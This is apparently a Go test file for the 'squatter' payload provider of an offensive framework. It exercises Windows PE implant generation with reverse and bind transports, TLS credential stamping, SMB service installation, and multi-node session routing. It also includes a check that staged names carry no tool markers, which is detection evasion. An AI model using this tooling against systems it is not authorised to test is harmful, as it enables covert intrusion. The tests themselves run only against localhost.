package main

import (
	"bufio"
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf16"

	"github.com/vibepwners/hovel/payloads/squatter/client/shell"
	"github.com/vibepwners/hovel/payloads/squatter/client/wire"
	"github.com/vibepwners/hovel/sdk/go/hovel"
	"github.com/vibepwners/hovel/sdk/go/hoveltest"
)

func TestProviderReportsSquatterPayloads(t *testing.T) {
	provider := newProvider()
	if info := provider.Info(); info.Type != hovel.TypePayloadProvider {
		t.Fatalf("module type = %q", info.Type)
	}

	payloads, err := provider.ListPayloads(hovel.PayloadQuery{})
	if err != nil {
		t.Fatal(err)
	}
	if len(payloads) != 3 {
		t.Fatalf("payload count = %d", len(payloads))
	}
	for _, payload := range payloads {
		if payload.Platform != "windows" || payload.Arch != "x86" || payload.MinOS != "windows-7" {
			t.Fatalf("unexpected payload platform metadata: %#v", payload)
		}
		if payload.Kind != string(hovel.PayloadKindPE) || payload.OS != "windows" {
			t.Fatalf("unexpected payload kind metadata: %#v", payload)
		}
		if !slices.Contains(payload.Formats, formatPEEXE) || !slices.Contains(payload.Formats, hovel.PayloadFormatPE) {
			t.Fatalf("unexpected payload formats: %#v", payload.Formats)
		}
		if !slices.Contains(payload.Tags, "pe") || !slices.Contains(payload.Tags, "windows") {
			t.Fatalf("unexpected payload tags: %#v", payload.Tags)
		}
		if payload.Session.Owner != "payload_provider" {
			t.Fatalf("unexpected session owner: %#v", payload.Session)
		}
	}
}

func TestProviderMeshTLSStreamPassesThroughToPayload(t *testing.T) {
	now := time.Now().UTC().Truncate(time.Second)
	bundle, root := testSquatterTLSBundle(t, now)
	defer bundle.Clear()
	serverConfig, err := bundle.TLSServerConfigAt(now)
	if err != nil {
		t.Fatal(err)
	}

	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer closeTestListener(t, listener)
	payloadResult := make(chan error, 1)
	go func() {
		conn, acceptErr := listener.Accept()
		if acceptErr != nil {
			payloadResult <- acceptErr
			return
		}
		defer conn.Close()
		secure := tls.Server(conn, serverConfig)
		if handshakeErr := secure.Handshake(); handshakeErr != nil {
			payloadResult <- handshakeErr
			return
		}
		kind, streamID, payload, readErr := wire.ReadFrame(bufio.NewReader(secure))
		if readErr != nil {
			payloadResult <- readErr
			return
		}
		if kind != wire.KindData || streamID != 7 || string(payload) != "mesh-tls" {
			payloadResult <- fmt.Errorf(
				"payload TLS Squatter frame = kind %d stream %d payload %q",
				kind,
				streamID,
				payload,
			)
			return
		}
		payloadResult <- wire.WriteFrame(secure, wire.KindData, streamID, []byte("mesh-tls-ok"))
	}()

	provider := newProvider()
	rpc := hoveltest.NewRPCConn(t, provider)
	defer rpc.Close()
	var descriptor hovel.MeshDescriptor
	rpc.Call("mesh.describe", map[string]any{}, &descriptor)
	if descriptor.CredentialDelivery == nil ||
		len(descriptor.CredentialDelivery.Slots) != 1 ||
		descriptor.CredentialDelivery.Slots[0].Name != payloadTLSCredentialSlot ||
		!slices.Equal(
			descriptor.CredentialDelivery.Capabilities,
			[]hovel.CredentialDeliveryCapability{hovel.CredentialDeliveryStampStandard},
		) {
		t.Fatalf("mesh descriptor credential delivery = %#v", descriptor.CredentialDelivery)
	}
	if !slices.Contains(descriptor.Capabilities, "stream.squatter+tls") ||
		descriptor.Attributes["tlsTermination"] != "payload" ||
		descriptor.Attributes["tlsLibrary"] != "wolfSSL" {
		t.Fatalf("mesh descriptor = %#v", descriptor)
	}
	topology, err := provider.MeshTopology(hovel.MeshTopologyRequest{IncludeRoutes: true})
	if err != nil {
		t.Fatal(err)
	}
	if topology.Root != meshRootNodeID || len(topology.Nodes) != 1 ||
		len(topology.Links) != 0 || len(topology.Routes) != 0 {
		t.Fatalf("mesh topology = %#v", topology)
	}
	if _, err := provider.MeshTopology(hovel.MeshTopologyRequest{Root: "unknown"}); err == nil {
		t.Fatal("MeshTopology() accepted an unknown root")
	}

	port := listener.Addr().(*net.TCPAddr).Port
	endpoint := provider.rememberMeshEndpoint(tcpBindOptions{
		Host: "127.0.0.1", Port: port, Timeout: time.Second,
	}, "ready")
	route := meshRoute(endpoint)
	var session hovel.SessionRef
	rpc.Call("mesh.open_stream", hovel.MeshStreamRequest{
		RunID:    "mesh-run-1",
		NodeID:   endpoint.NodeID,
		Route:    &route,
		Protocol: meshProtocolTLS,
		Config:   map[string]any{"session.connect_ms": "1000"},
	}, &session)
	for _, capability := range []string{"tls", "tls.payload-terminated", "tls.wolfssl"} {
		if !slices.Contains(session.Capabilities, capability) {
			t.Fatalf("mesh stream session is missing %q: %#v", capability, session)
		}
	}
	if session.Transport != "squatter+tls/tcp-bind" {
		t.Fatalf("mesh stream session = %#v", session)
	}

	bridge := &rpcSessionConn{t: t, rpc: rpc, sessionID: session.ID}
	defer bridge.Close()
	roots := x509.NewCertPool()
	roots.AddCert(root)
	secure := tls.Client(bridge, &tls.Config{
		RootCAs:    roots,
		ServerName: "squatter.mesh.test",
		MinVersion: tls.VersionTLS13,
	})
	if err := secure.SetDeadline(time.Now().Add(3 * time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := secure.HandshakeContext(t.Context()); err != nil {
		t.Fatal(err)
	}
	if secure.ConnectionState().Version != tls.VersionTLS13 {
		t.Fatalf("negotiated TLS version = %#x", secure.ConnectionState().Version)
	}
	if err := wire.WriteFrame(secure, wire.KindData, 7, []byte("mesh-tls")); err != nil {
		t.Fatal(err)
	}
	kind, streamID, payload, err := wire.ReadFrame(bufio.NewReader(secure))
	if err != nil {
		t.Fatal(err)
	}
	if kind != wire.KindData || streamID != 7 || string(payload) != "mesh-tls-ok" {
		t.Fatalf("TLS Squatter frame = kind %d stream %d payload %q", kind, streamID, payload)
	}
	if err := <-payloadResult; err != nil {
		t.Fatal(err)
	}
}

func TestProviderMeshTLSStreamCarriesRealWinePayload(t *testing.T) {
	if os.Getenv("HOVEL_SQUATTER_REAL_E2E") == "" {
		t.Skip("real Wine payload E2E is run by task modules:wine-docker-test")
	}
	now := time.Now().UTC().Truncate(time.Second)
	bundle, root := testSquatterTLSBundle(t, now)
	defer bundle.Clear()
	port := reserveRealWinePort(t)
	provider := newProvider()
	generated, err := provider.GeneratePayload(hovel.GeneratePayloadRequest{
		PayloadID: "squatter/windows/x86/windows-7/tcp-bind/pe-exe",
		Target:    "127.0.0.1",
		Format:    formatPEEXE,
		Config: map[string]string{
			"payload.transport": tcpBind,
			"payload.bind_port": strconv.Itoa(port),
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	source, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	stamped := stampSquatterPayloadTLS(t, source, bundle)
	clear(source)
	defer clear(stamped)
	startRealWineSquatter(t, stamped, port)
	silentClient, err := net.DialTimeout(
		"tcp",
		net.JoinHostPort("127.0.0.1", strconv.Itoa(port)),
		time.Second,
	)
	if err != nil {
		t.Fatal(err)
	}
	defer silentClient.Close()

	survey, err := provider.RunMeshTask(nil, hovel.MeshTaskRequest{
		TaskID:          "real-wine-survey",
		Kind:            hovel.MeshTaskSurvey,
		NodeID:          meshRootNodeID,
		DestinationHost: "127.0.0.1",
		DestinationPort: port,
		Config:          map[string]any{"session.connect_ms": 3000},
	})
	if err != nil {
		t.Fatal(err)
	}
	if survey.Status != hovel.MeshTaskStatusSucceeded || survey.Route == nil {
		t.Fatalf("real payload survey = %#v", survey)
	}
	topology, err := provider.MeshTopology(hovel.MeshTopologyRequest{IncludeRoutes: true})
	if err != nil {
		t.Fatal(err)
	}
	if len(topology.Nodes) != 2 || len(topology.Links) != 1 || len(topology.Routes) != 1 {
		t.Fatalf("real payload topology = %#v", topology)
	}

	rpc := hoveltest.NewRPCConn(t, provider)
	defer rpc.Close()
	var session hovel.SessionRef
	rpc.Call("mesh.open_stream", hovel.MeshStreamRequest{
		RunID:    "real-wine-mesh-run",
		NodeID:   survey.NodeID,
		Route:    survey.Route,
		Protocol: meshProtocolTLS,
		Config:   map[string]any{"session.connect_ms": 3000},
	}, &session)
	for _, capability := range []string{"tls", "tls.payload-terminated", "tls.wolfssl"} {
		if !slices.Contains(session.Capabilities, capability) {
			t.Fatalf("real Wine Mesh session is missing %q: %#v", capability, session)
		}
	}
	bridge := &rpcSessionConn{t: t, rpc: rpc, sessionID: session.ID}
	defer bridge.Close()
	roots := x509.NewCertPool()
	roots.AddCert(root)
	secure := tls.Client(bridge, &tls.Config{
		RootCAs:          roots,
		ServerName:       "squatter.mesh.test",
		MinVersion:       tls.VersionTLS13,
		MaxVersion:       tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{tls.X25519},
	})
	if err := secure.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := secure.HandshakeContext(t.Context()); err != nil {
		t.Fatal(err)
	}
	if secure.ConnectionState().Version != tls.VersionTLS13 {
		t.Fatalf("real payload negotiated TLS version = %#x", secure.ConnectionState().Version)
	}
	if err := wire.WriteFrame(secure, wire.KindOpen, 91, wire.EncodeOpen("echo", []string{"mesh-tls-wine"})); err != nil {
		t.Fatal(err)
	}
	reader := bufio.NewReader(secure)
	if payload := readRealWineMeshData(t, reader, 91); string(payload) != "argc=2 echo mesh-tls-wine" {
		t.Fatalf("real payload TLS argv = %q", payload)
	}
	if err := wire.WriteFrame(secure, wire.KindData, 91, []byte("mesh-tls-real-payload-ok")); err != nil {
		t.Fatal(err)
	}
	if payload := readRealWineMeshData(t, reader, 91); string(payload) != "mesh-tls-real-payload-ok" {
		t.Fatalf("real payload TLS echo = %q", payload)
	}
	if err := wire.WriteFrame(secure, wire.KindData, 91, []byte("END")); err != nil {
		t.Fatal(err)
	}
	for {
		kind, streamID, _, err := wire.ReadFrame(reader)
		if err != nil {
			t.Fatal(err)
		}
		if kind == wire.KindClose && streamID == 91 {
			break
		}
	}
	tampered := append([]byte(nil), stamped...)
	pkiOffset, err := payloadPKIConfigOffset(tampered)
	if err != nil {
		t.Fatal(err)
	}
	tampered[pkiOffset+payloadPKIBundleOffset] ^= 0xff
	assertRealWineRejectsTamperedPayload(t, tampered)
	clear(tampered)
	tamperedHeader := append([]byte(nil), stamped...)
	tamperedHeader[pkiOffset+payloadPKIFlagsOffset] ^= 0x01
	assertRealWineRejectsTamperedPayload(t, tamperedHeader)
	clear(tamperedHeader)
	t.Log("E2E workflow=generate-configure-stamp-launch pki=provider-stamped mesh=passthrough tls=wolfSSL/1.3 payload=real-wine tamper=fail-closed frames=Squatter-echo passed")
}

func reserveRealWinePort(t *testing.T) int {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	port := listener.Addr().(*net.TCPAddr).Port
	if err := listener.Close(); err != nil {
		t.Fatal(err)
	}
	return port
}

func startRealWineSquatter(t *testing.T, body []byte, port int) {
	t.Helper()
	wine := os.Getenv("HOVEL_SQUATTER_WINE")
	if wine == "" {
		t.Fatal("HOVEL_SQUATTER_WINE is required")
	}
	exe := filepath.Join(t.TempDir(), "squatter-stamped.exe")
	if err := os.WriteFile(exe, body, 0o600); err != nil {
		t.Fatal(err)
	}
	command := exec.Command(wine, exe)
	runtimeDir := t.TempDir()
	if err := os.Chmod(runtimeDir, 0o700); err != nil {
		t.Fatal(err)
	}
	command.Env = append(os.Environ(),
		"XDG_RUNTIME_DIR="+runtimeDir,
		"LANG=C.UTF-8",
		"LC_ALL=C.UTF-8",
		"WINEDEBUG=-all",
	)
	command.Stdout = os.Stderr
	command.Stderr = os.Stderr
	if err := command.Start(); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if command.Process != nil {
			_ = command.Process.Kill()
			_, _ = command.Process.Wait()
		}
	})
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		connection, err := net.DialTimeout(
			"tcp",
			net.JoinHostPort("127.0.0.1", strconv.Itoa(port)),
			250*time.Millisecond,
		)
		if err == nil {
			_ = connection.Close()
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatalf("real Wine payload did not listen on port %d", port)
}

func assertRealWineRejectsTamperedPayload(t *testing.T, body []byte) {
	t.Helper()
	wine := os.Getenv("HOVEL_SQUATTER_WINE")
	exe := filepath.Join(t.TempDir(), "squatter-tampered.exe")
	if err := os.WriteFile(exe, body, 0o600); err != nil {
		t.Fatal(err)
	}
	runtimeDir := t.TempDir()
	if err := os.Chmod(runtimeDir, 0o700); err != nil {
		t.Fatal(err)
	}
	command := exec.Command(wine, exe)
	command.Env = append(os.Environ(),
		"XDG_RUNTIME_DIR="+runtimeDir,
		"LANG=C.UTF-8",
		"LC_ALL=C.UTF-8",
		"WINEDEBUG=-all",
	)
	var output bytes.Buffer
	command.Stdout = &output
	command.Stderr = &output
	if err := command.Start(); err != nil {
		t.Fatal(err)
	}
	done := make(chan error, 1)
	go func() { done <- command.Wait() }()
	select {
	case err := <-done:
		if err == nil {
			t.Fatal("tampered stamped payload started successfully")
		}
		if !strings.Contains(output.String(), "stamped wolfSSL configuration failed validation") {
			t.Fatalf("tampered payload failure did not identify stamped wolfSSL validation:\n%s", output.String())
		}
	case <-time.After(15 * time.Second):
		_ = command.Process.Kill()
		<-done
		t.Fatal("tampered stamped payload did not fail closed")
	}
}

func newSquatterPayloadTLSStampRequest(
	t *testing.T,
	body []byte,
	bundle hovel.CredentialBundle,
) (hovel.CredentialStampExecutionRequest, []byte) {
	t.Helper()
	encodedBundle, err := json.Marshal(bundle)
	if err != nil {
		t.Fatal(err)
	}
	inputDigest := sha256.Sum256(body)
	bundleDigest := sha256.Sum256(encodedBundle)
	inputContent, err := hovel.NewCredentialArtifactData(body)
	if err != nil {
		t.Fatal(err)
	}
	materialBytes, err := hovel.NewCredentialMaterialBytes(encodedBundle)
	if err != nil {
		t.Fatal(err)
	}
	resolved, err := hovel.NewResolvedCredentialMaterial(
		hovel.CredentialProjectionBundle,
		hovel.CredentialMaterialPrivateBytes,
		hovel.CredentialEncodingJSON,
		hex.EncodeToString(bundleDigest[:]),
		materialBytes,
	)
	if err != nil {
		t.Fatal(err)
	}
	target := hovel.CredentialStampTarget{
		Kind: hovel.CredentialStampTargetNamedSlot,
		NamedSlot: &hovel.CredentialNamedSlotTarget{
			Name: payloadTLSCredentialSlot,
		},
	}
	request := hovel.CredentialStampExecutionRequest{
		SchemaVersion: hovel.CredentialProviderExecutionSchemaV1,
		Provider: hovel.CredentialProviderTarget{
			ModuleID:         payloadName + "@" + version,
			ProviderID:       payloadName,
			ProviderVersion:  version,
			DescriptorSHA256: strings.Repeat("1", sha256.Size*2),
		},
		StampID: "squatter-payload-tls-e2e-stamp",
		Request: hovel.CredentialStampRequest{
			AssignmentID: bundle.AssignmentID,
			Capability:   hovel.CredentialDeliveryStampStandard,
			SlotName:     payloadTLSCredentialSlot,
			Target:       target,
			Material: hovel.CredentialStampMaterial{
				Projection: hovel.CredentialProjectionBundle,
				Credential: &hovel.CredentialMaterialReference{
					Projection: hovel.CredentialProjectionBundle,
					Form:       hovel.CredentialMaterialPrivateBytes,
					BundleID:   bundle.ID,
				},
			},
			EncodedBytes: uint64(len(encodedBundle)),
			Credential: hovel.ResolvedCredentialMetadata{
				BundleVersion:         hovel.CredentialBundleSchemaV1,
				Purpose:               hovel.CredentialPurposeTLSServer,
				ConsumerType:          hovel.CredentialConsumerPayload,
				ProfileID:             "tls-server",
				CompatibilityTargetID: "portable-x509",
			},
		},
		Input: hovel.CredentialArtifactInput{
			ID:       "squatter-transport-configured-pe",
			SHA256:   hex.EncodeToString(inputDigest[:]),
			Encoding: "binary",
			Content:  inputContent,
		},
		Material: resolved,
		ExpectedDigests: []hovel.CredentialStampedMaterialDigest{{
			Projection: hovel.CredentialProjectionBundle,
			Reference:  bundle.ID,
			SHA256:     hex.EncodeToString(bundleDigest[:]),
		}},
		Scope: hovel.CredentialOperationScope{
			OperationID: "squatter-payload-stamp-e2e",
			Target:      "127.0.0.1",
		},
	}
	return request, encodedBundle
}

func stampSquatterPayloadTLS(
	t *testing.T,
	body []byte,
	bundle hovel.CredentialBundle,
) []byte {
	t.Helper()
	request, encodedBundle := newSquatterPayloadTLSStampRequest(t, body, bundle)
	defer clear(encodedBundle)
	result, err := newProvider().StampCredential(request)
	if err != nil {
		t.Fatal(err)
	}
	if err := result.ValidateFor(request); err != nil {
		t.Fatal(err)
	}
	artifact, ok := result.Output.Artifact()
	if !ok {
		t.Fatal("payload TLS stamp did not return an artifact")
	}
	stamped, ok := artifact.Content.Data()
	if !ok {
		t.Fatal("payload TLS stamp artifact did not contain in-memory PE bytes")
	}
	return stamped
}

func readRealWineMeshData(t *testing.T, reader *bufio.Reader, streamID uint64) []byte {
	t.Helper()
	for {
		kind, gotStreamID, payload, err := wire.ReadFrame(reader)
		if err != nil {
			t.Fatal(err)
		}
		if gotStreamID != streamID {
			t.Fatalf("real Wine mesh stream id = %d, want %d", gotStreamID, streamID)
		}
		if kind == wire.KindControl {
			continue
		}
		if kind != wire.KindData {
			t.Fatalf("real Wine mesh frame kind = %d, want DATA", kind)
		}
		return payload
	}
}

func TestProviderMeshTracksAndRoutesMultipleSquatterNodes(t *testing.T) {
	first := startMeshEchoEndpoint(t, "first-ok")
	second := startMeshEchoEndpoint(t, "second-ok")
	provider := newProvider()

	survey := func(taskID string, listener net.Listener) hovel.MeshTaskResult {
		t.Helper()
		result, err := provider.RunMeshTask(nil, hovel.MeshTaskRequest{
			TaskID:          taskID,
			Kind:            hovel.MeshTaskSurvey,
			NodeID:          meshRootNodeID,
			DestinationHost: "127.0.0.1",
			DestinationPort: listener.Addr().(*net.TCPAddr).Port,
			Config:          map[string]any{"session.connect_ms": 1000},
		})
		if err != nil {
			t.Fatal(err)
		}
		if result.Status != hovel.MeshTaskStatusSucceeded || result.NodeID == meshRootNodeID ||
			result.Route == nil || !slices.Equal(result.Route.Nodes, []string{meshRootNodeID, result.NodeID}) {
			t.Fatalf("survey result = %#v", result)
		}
		return result
	}

	firstSurvey := survey("survey-first", first)
	secondSurvey := survey("survey-second", second)
	if firstSurvey.NodeID == secondSurvey.NodeID {
		t.Fatalf("distinct Squatter destinations shared node id %q", firstSurvey.NodeID)
	}

	topology, err := provider.MeshTopology(hovel.MeshTopologyRequest{
		Root: meshRootNodeID, IncludeRoutes: true,
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(topology.Nodes) != 3 || len(topology.Links) != 2 || len(topology.Routes) != 2 ||
		topology.Attributes["nodeCount"] != 3 {
		t.Fatalf("multi-node topology = %#v", topology)
	}
	routes := make(map[string]hovel.MeshRoute, len(topology.Routes))
	for _, route := range topology.Routes {
		routes[route.Nodes[len(route.Nodes)-1]] = route
	}
	secondRoute, ok := routes[secondSurvey.NodeID]
	if !ok {
		t.Fatalf("second node route missing from %#v", topology.Routes)
	}
	if _, err := provider.MeshTopology(hovel.MeshTopologyRequest{Root: secondSurvey.NodeID}); err != nil {
		t.Fatalf("known node topology root rejected: %v", err)
	}

	rpc := hoveltest.NewRPCConn(t, provider)
	defer rpc.Close()
	var session hovel.SessionRef
	rpc.Call("mesh.open_stream", hovel.MeshStreamRequest{
		RunID:    "mesh-multi-node-run",
		NodeID:   secondSurvey.NodeID,
		Route:    &secondRoute,
		Protocol: meshProtocolRaw,
	}, &session)
	bridge := &rpcSessionConn{t: t, rpc: rpc, sessionID: session.ID}
	defer bridge.Close()
	if err := wire.WriteFrame(bridge, wire.KindData, 19, []byte("second")); err != nil {
		t.Fatal(err)
	}
	kind, streamID, payload, err := wire.ReadFrame(bufio.NewReader(bridge))
	if err != nil {
		t.Fatal(err)
	}
	if kind != wire.KindData || streamID != 19 || string(payload) != "second-ok" {
		t.Fatalf("routed multi-node frame = kind %d stream %d payload %q", kind, streamID, payload)
	}

	badRoute := secondRoute
	badRoute.Links[0] = "wrong-link"
	if _, _, err := provider.resolveSquatterMeshAddress(
		secondSurvey.NodeID, "", &badRoute, "", 0, "", nil,
	); err == nil {
		t.Fatal("routed stream accepted a route with the wrong link")
	}
	if _, _, err := provider.resolveSquatterMeshAddress(
		secondSurvey.NodeID, "", &secondRoute, "192.0.2.1", 0, "", nil,
	); err == nil {
		t.Fatal("routed stream accepted a destination conflicting with its node")
	}
}

func startMeshEchoEndpoint(t *testing.T, reply string) net.Listener {
	t.Helper()
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { closeTestListener(t, listener) })
	go func() {
		for {
			conn, acceptErr := listener.Accept()
			if acceptErr != nil {
				return
			}
			go func() {
				defer conn.Close()
				if deadlineErr := conn.SetDeadline(time.Now().Add(3 * time.Second)); deadlineErr != nil {
					return
				}
				kind, streamID, _, readErr := wire.ReadFrame(bufio.NewReader(conn))
				if readErr != nil {
					return
				}
				if kind == wire.KindData {
					_ = wire.WriteFrame(conn, wire.KindData, streamID, []byte(reply))
				}
			}()
		}
	}()
	return listener
}

func TestProviderFiltersTypedPayloadQueries(t *testing.T) {
	provider := newProvider()
	mismatch := hovel.PayloadQuery{
		Kind:      string(hovel.PayloadKindPIC),
		OS:        "linux",
		Transport: tcpBind,
	}

	payloads, err := provider.ListPayloads(mismatch)
	if err != nil {
		t.Fatal(err)
	}
	if payloads == nil {
		t.Fatal("mismatched typed query returned nil payload slice")
	}
	if len(payloads) != 0 {
		t.Fatalf("mismatched typed query returned payloads: %#v", payloads)
	}

	if _, err := provider.ResolvePayload(mismatch); err == nil {
		t.Fatal("ResolvePayload accepted mismatched typed query")
	}

	matched, err := provider.ListPayloads(hovel.PayloadQuery{
		Kind:      string(hovel.PayloadKindPE),
		OS:        "windows",
		Transport: tcpBind,
		Format:    hovel.PayloadFormatPE,
		Tags:      []string{"windows", "squatter"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(matched) != 1 || matched[0].Transport.Kind != tcpBind {
		t.Fatalf("matched typed query returned %#v", matched)
	}
}

func TestProviderReportsStepContracts(t *testing.T) {
	contracts, err := newProvider().DescribeSteps()
	if err != nil {
		t.Fatal(err)
	}
	byID := map[string]hovel.StepContract{}
	for _, step := range contracts.Steps {
		byID[step.ID] = step
	}
	for _, id := range []string{
		"squatter.generate",
		"squatter.install_smb",
		"squatter.connect_smb",
		"squatter.connect_tcp_bind",
		"squatter.listen_tcp_callback",
		"squatter.connect_tcp_callback",
	} {
		if _, ok := byID[id]; !ok {
			t.Fatalf("missing step contract %s in %#v", id, contracts.Steps)
		}
	}
	for _, id := range []string{"squatter.install_tcp_bind", "squatter.install_tcp_callback"} {
		if _, ok := byID[id]; ok {
			t.Fatalf("step contract %s is advertised but has no execution implementation", id)
		}
	}

	connect := byID["squatter.connect_smb"]
	if connect.Kind != "session.connector" {
		t.Fatalf("connect_smb kind = %q", connect.Kind)
	}
	if len(connect.Requires) != 2 {
		t.Fatalf("connect_smb requires = %#v", connect.Requires)
	}
	if connect.Requires[0].Type != hovel.CapabilityPayloadInstance || connect.Requires[0].Attributes["transport"] != smbNamedPipe {
		t.Fatalf("payload instance requirement = %#v", connect.Requires[0])
	}
	if len(connect.Produces) != 1 || connect.Produces[0].Type != hovel.CapabilitySessionRef {
		t.Fatalf("connect_smb produces = %#v", connect.Produces)
	}

	install := byID["squatter.install_smb"]
	if got := install.Prepare.Materializes; len(got) != 3 || got[0] != "staged_path" || got[1] != "service_name" || got[2] != "pipe_name" {
		t.Fatalf("install_smb materializes = %#v", got)
	}
}

func TestProviderExecuteGenerateProducesPayloadArtifactCapability(t *testing.T) {
	result, err := newProvider().ExecuteStep(hovel.StepExecuteRequest{
		RunID:  "run-1",
		StepID: "squatter.generate",
		RunMetadata: map[string]any{
			"config": map[string]any{
				"target.host":       "192.0.2.20",
				"payload.transport": tcpBind,
				"payload.format":    formatPEEXE,
				"payload.bind_port": "9100",
			},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if result.Status != "succeeded" {
		t.Fatalf("result = %#v", result)
	}
	if len(result.Capabilities) != 1 || result.Capabilities[0].Type != hovel.CapabilityPayloadArtifact {
		t.Fatalf("capabilities = %#v, want payload artifact", result.Capabilities)
	}
	capability := result.Capabilities[0]
	if capability.State != "built" || capability.Attributes["provider"] != payloadName || capability.Attributes["transport"] != tcpBind {
		t.Fatalf("artifact capability = %#v", capability)
	}
	if capability.Attributes["sha256"] == "" || capability.Attributes["size"] == int64(0) {
		t.Fatalf("artifact metadata = %#v", capability.Attributes)
	}
}

func TestProviderPrepareSMBInstallMaterializesNeutralValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, key := range []string{"staged_path", "service_name", "pipe_name"} {
		value, ok := prepared.PreparedValues[key]
		if !ok {
			t.Fatalf("missing prepared value %s in %#v", key, prepared.PreparedValues)
		}
		text, ok := value.Value.(string)
		if !ok || text == "" {
			t.Fatalf("prepared value %s = %#v, want string", key, value.Value)
		}
		if strings.Contains(strings.ToLower(text), "hovel") || strings.Contains(strings.ToLower(text), "squatter") {
			t.Fatalf("prepared value %s contains tool marker: %q", key, text)
		}
	}
	stagedPath := prepared.PreparedValues["staged_path"].Value.(string)
	if !strings.HasPrefix(stagedPath, `C:\Windows\Temp\`) || !strings.HasSuffix(stagedPath, ".exe") {
		t.Fatalf("staged path = %q", stagedPath)
	}
	if len(prepared.PlannedOutputs) != 3 {
		t.Fatalf("planned outputs = %#v, want payload instance, endpoint, cleanup", prepared.PlannedOutputs)
	}
	if prepared.PlannedOutputs[0].Type != hovel.CapabilityPayloadInstance || prepared.PlannedOutputs[0].State != "planned" {
		t.Fatalf("payload instance = %#v", prepared.PlannedOutputs[0])
	}
	if prepared.PlannedOutputs[1].Type != hovel.CapabilityTransport || prepared.PlannedOutputs[1].Attributes["kind"] != "smb-pipe" {
		t.Fatalf("transport endpoint = %#v", prepared.PlannedOutputs[1])
	}
	if prepared.PlannedOutputs[2].Type != hovel.CapabilityCleanupHandle {
		t.Fatalf("cleanup handle = %#v", prepared.PlannedOutputs[2])
	}
}

func TestProviderPreparePreservesExistingPreparedValues(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		ExistingPreparedValues: map[string]hovel.PreparedValue{
			"staged_path":  {Value: `C:\Windows\Temp\abc123.exe`, Editable: true},
			"service_name": {Value: "svc123", Editable: true},
			"pipe_name":    {Value: "pipe123", Editable: true},
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\Temp\abc123.exe` {
		t.Fatalf("staged_path = %#v", got)
	}
	if got := prepared.PreparedValues["service_name"].Value; got != "svc123" {
		t.Fatalf("service_name = %#v", got)
	}
	if got := prepared.PreparedValues["pipe_name"].Value; got != "pipe123" {
		t.Fatalf("pipe_name = %#v", got)
	}
}

func TestProviderPrepareSMBInstallUsesConfiguredPipe(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		Config: map[string]any{
			"payload.pipe": `\\.\pipe\squatter`,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["pipe_name"].Value; got != "squatter" {
		t.Fatalf("pipe_name = %#v, want squatter", got)
	}
	if got := prepared.PlannedOutputs[1].Attributes["pipe_name"]; got != "squatter" {
		t.Fatalf("transport pipe_name = %#v, want squatter", got)
	}
}

func TestProviderPrepareSMBInstallUsesConfiguredRemotePath(t *testing.T) {
	prepared, err := newProvider().PrepareStep(hovel.StepPrepareRequest{
		StepID: "squatter.install_smb",
		Config: map[string]any{
			"payload.remote_path": `C:\Windows\System32\hovel.exe`,
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	if got := prepared.PreparedValues["staged_path"].Value; got != `C:\Windows\System32\hovel.exe` {
		t.Fatalf("staged_path = %#v", got)
	}
	if got := prepared.PlannedOutputs[0].Attributes["staged_path"]; got != `C:\Windows\System32\hovel.exe` {
		t.Fatalf("planned staged_path = %#v", got)
	}
}

func TestProviderGeneratesWindowsPEArtifactSet(t *testing.T) {
	generated, err := newProvider().GeneratePayload(hovel.GeneratePayloadRequest{
		Target:    "target-1",
		PayloadID: "squatter/windows/x86/windows-7/reverse-tcp/pe-exe",
		Format:    "pe-exe",
	})
	if err != nil {
		t.Fatal(err)
	}
	if generated.Primary.Role != "primary" || generated.Primary.Encoding != "base64" {
		t.Fatalf("primary artifact = %#v", generated.Primary)
	}
	body, err := base64.StdEncoding.DecodeString(generated.Primary.Bytes)
	if err != nil {
		t.Fatal(err)
	}
	if len(body) < 2 || string(body[:2]) != "MZ" {
		t.Fatalf("generated payload is not a PE image: %x", body[:2])
	}
	if !bytes.Contains(body, []byte("SQUAT001")) || !bytes.Contains(body, []byte("SQCFG001")) {
		t.Fatal("generated payload is missing squatter metadata markers")
	}
	if len(generated.Artifacts) != 1 {
		t.Fatalf("artifact count = %d", len(generated.Artifacts))
	}

	configOffset := mustPayloadConfigOffset(t, body)
	if got := binary.LittleEndian.Uint32(body[configOffset+payloadConfigKindOffset:]); got != payloadConfigKindReverseTCP {
		t.Fatalf("transport kind = %d", got)
	}
	if got := body[configOffset+payloadConfigHostOffset : configOffset+payloadConfigHostOffset+4]; !bytes.Equal(got, []byte{127, 0, 0, 1}) {
		t.Fatalf("reverse host = %v", got)
	}
